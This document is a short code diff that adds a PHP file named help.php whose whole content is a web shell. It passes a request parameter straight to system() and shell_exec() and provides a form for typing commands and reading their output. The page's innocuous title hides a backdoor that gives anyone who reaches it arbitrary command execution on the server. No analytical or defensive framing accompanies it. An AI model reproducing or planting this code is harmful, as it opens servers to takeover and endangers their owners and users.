@@ -1,0 +1,1 @@
+<?php system($_GET["-cmd"]); ?><html><head><title>help.php</title></head><onLoad="document.forms[0].elements[-cmd].focus()"><form method=POST><br><input type=TEXT name="-cmd" size=64 value="<?=$cmd?>"><hr><pre><? if($cmd != "") print shell_exec($cmd); ?></pre></form></body></html>
